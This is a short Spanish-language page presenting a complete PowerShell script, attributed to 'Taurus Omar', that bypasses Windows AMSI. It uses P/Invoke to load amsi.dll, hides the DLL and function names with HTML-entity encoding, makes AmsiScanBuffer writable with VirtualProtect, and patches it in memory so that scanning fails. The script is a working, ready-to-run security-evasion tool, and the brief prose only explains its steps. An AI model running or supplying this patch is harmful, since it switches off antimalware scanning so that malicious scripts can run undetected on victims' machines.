# Bypass AMSI PInvoke
Este script en PowerShell utiliza P/Invoke (Platform Invocation Services), que es un mecanismo para interactuar con funciones nativas de la API de Windows desde código administrado en .NET para interactuar con la biblioteca **`kernel32.dll`** de Windows. Define una clase **`PInvoke`** con métodos para cargar una biblioteca  **`LoadLibrary`**, obtener la dirección de una función  **`GetProcAddress`** y cambiar los permisos de memoria  **`VirtualProtect`**.

Luego, decodifica los nombres de la biblioteca  **`amsi.dll`** y la función  **`AmsiScanBuffer`**, los carga en memoria y cambia sus permisos de memoria. Finalmente, parchea la función  **`AmsiScanBuffer`** en tiempo de ejecución con un nuevo código de máquina.

```
# Author: Taurus Omar
$PInvokeDeclarations = @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $PInvokeDeclarations

$amsiDll = [System.Net.WebUtility]::HtmlDecode('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;')
$amsiScanBuffer = [System.Net.WebUtility]::HtmlDecode('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;')

$amsiDllHandle = [PInvoke]::LoadLibrary($amsiDll)
$amsiScanBufferPtr = [PInvoke]::GetProcAddress($amsiDllHandle, $amsiScanBuffer)

$oldProtect = 0
[PInvoke]::VirtualProtect($amsiScanBufferPtr, [uint32]5, 0x40, [ref]$oldProtect)

$patchBytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patchBytes, 0, $amsiScanBufferPtr, 6)

```
